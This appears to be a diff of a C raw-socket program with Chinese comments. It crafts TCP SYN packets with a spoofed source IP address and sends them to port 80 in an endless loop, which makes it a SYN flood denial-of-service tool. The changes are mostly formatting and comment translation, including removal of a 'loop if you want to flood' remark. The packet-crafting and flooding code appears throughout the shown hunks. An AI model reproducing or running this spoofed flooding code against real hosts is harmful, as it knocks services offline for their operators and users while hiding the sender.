@@ -11,7 +11,7 @@ struct pseudo_header//12bytes伪首部
     uint32_t source_address;
     uint32_t des_address;
     uint8_t placeholder;
-    uint8_t protocol; //标识上层协议类型
+    uint8_t protocol; //标识上层协议类型 
     uint16_t tcp_length;
 };
 
@@ -24,12 +24,12 @@ unsigned short checksum(unsigned short *ptr, int nbytes) //用于计算ip和tcp�
     while(nbytes > 1)
     {
         sum += *ptr++;
-        nbytes-=2;
+        nbytes -= 2;
     }
     if(nbytes == 1)
     {
         oddbyte = 0;
-        *((u_char *) & oddbyte) = *(u_char *) ptr;
+         *((u_char *) & oddbyte) = *(u_char *) ptr;
         sum += oddbyte;
     }
     sum = (sum >> 16) + (sum & 0xffff);
@@ -53,8 +53,7 @@ int main()
     struct sockaddr_in sin;
     struct pseudo_header psh;
     data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    strcpy(data, "Hello");
-    
+    strcpy(data, "Hello");    
     strcpy(source_ip, "192.168.1.2"); //设置源地址（虚假地址）
     sin.sin_family = AF_INET; //标识TCP/IP协议簇
     sin.sin_port = htons(80); //端口号（htons从little endian 转换为 big endian）
@@ -64,8 +63,7 @@ int main()
     ip_hdr->version = 4;  //IPV4
     ip_hdr->tos = 0;
     ip_hdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
-    ip_hdr->id = htonl(54321);
-    ip_hdr->frag_off = 0;  
+    ip_hdr->id = htonl(54321);    ip_hdr->frag_off = 0;  
     ip_hdr->ttl = 255;
     ip_hdr->protocol = IPPROTO_TCP;  //上层协议使用TCP
     ip_hdr->check = 0;//校验和先置为0，后面会计算
@@ -75,13 +73,12 @@ int main()
     //设置tcp头
     tcp_hdr->source = htons(1234);
     tcp_hdr->dest = htons(80); //设置端口号
-    tcp_hdr->seq = 0;
-    tcp_hdr->ack_seq = 0;
+    tcp_hdr->seq = 0;    tcp_hdr->ack_seq = 0;
     tcp_hdr->doff = 5;  // tcp头的大小为5个字节
-    tcp_hdr->fin=0;
-    tcp_hdr->syn=1; 
-    tcp_hdr->psh=0;
-    tcp_hdr->urg=0;
+    tcp_hdr->fin = 0;
+    tcp_hdr->syn = 1; 
+    tcp_hdr->psh = 0;
+    tcp_hdr->urg = 0;
     tcp_hdr->window = htons (5840);//设置最大窗口值 
     tcp_hdr->check = 0; //设置校验和为0，之后计算
     tcp_hdr->urg_ptr = 0;
@@ -106,16 +103,15 @@ int main()
         perror("Error setting IP_HDRINCL");
         exit(0);
     }
-     
-    //loop if you want to flood :)
+    
     while (1)
    {
-        //Send the packet
+       //发送已经封装好的数据包
         if (sendto (s, datagram, ip_hdr->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
         {
             perror("sendto failed");
        }
-        //Data send successfully
+        //数据发送成功
         else
         {
             printf ("Packet Send. Length : %d \n" , ip_hdr->tot_len);
